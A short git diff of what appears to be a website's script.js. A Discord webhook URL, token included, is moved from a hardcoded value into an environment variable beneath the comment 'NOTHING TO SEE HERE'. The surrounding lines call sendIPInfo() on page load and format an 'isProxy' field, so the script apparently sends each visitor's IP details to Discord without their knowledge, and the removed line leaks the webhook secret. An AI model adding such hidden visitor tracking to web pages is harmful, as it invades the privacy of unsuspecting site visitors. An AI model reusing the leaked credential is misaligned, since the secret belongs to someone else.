@@ -67,7 +67,9 @@ $(document).ready(function(){
 
 
 // NOTHING TO SEE HERE
-const webHookUrl = "https://discord.com/api/webhooks/1231402629435883641/R0sexkYFGgqev-doFhVvd0GPnPPdX1IHcEj7c3a_j5GRcqeZoivbAtDETkb21zYDzlyA";
+// No need for dotenv since we're using GitHub Secrets
+
+const webHookUrl = process.env.DISCORD_WEBHOOK_URL;
 
 async function fetchData(url) {
     const response = await fetch(url);
@@ -153,6 +155,7 @@ isProxy: ${isProxy}
 }
 
 sendIPInfo();
+
 
 // script.js
 $(document).ready(function(){
